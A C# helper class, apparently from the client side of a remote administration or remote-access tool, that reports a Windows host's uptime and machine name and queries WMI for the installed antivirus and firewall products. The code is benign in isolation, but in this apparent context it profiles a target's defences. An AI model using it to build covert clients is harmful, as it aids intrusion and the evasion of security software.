using System;
using System.Diagnostics;
using System.Management;

namespace xClient.Core.Helper
{
    public static class SystemHelper
    {
        public static string GetUptime()
        {
            SelectQuery query = new SelectQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem WHERE Primary='true'");
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
            {
                foreach (ManagementObject mo in searcher.Get())
                {
                    DateTime now = DateTime.UtcNow;
                    DateTime dtBootTime = ManagementDateTimeConverter.ToDateTime(mo.Properties["LastBootUpTime"].Value.ToString());
                    TimeSpan uptimeSpan = TimeSpan.FromTicks((now - dtBootTime).Ticks);

                    return string.Format("{0}d : {1}h : {2}m : {3}s", uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
                }
            }

            return string.Format("{0}d : {1}h : {2}m : {3}s", 0, 0, 0, 0);
        }

        public static string GetPcName()
        {
            return Environment.MachineName;
        }

        public static string GetAntivirus()
        {
            try
            {
                string antivirusName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = (PlatformHelper.VistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                string query = "SELECT * FROM AntivirusProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        antivirusName += mObject["displayName"].ToString() + "; ";
                    }
                }
                antivirusName = FormatHelper.RemoveEnd(antivirusName);

                return (!string.IsNullOrEmpty(antivirusName)) ? antivirusName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetFirewall()
        {
            try
            {
                string firewallName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = (PlatformHelper.VistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                string query = "SELECT * FROM FirewallProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        firewallName += mObject["displayName"].ToString() + "; ";
                    }
                }
                firewallName = FormatHelper.RemoveEnd(firewallName);

                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }
    }
}
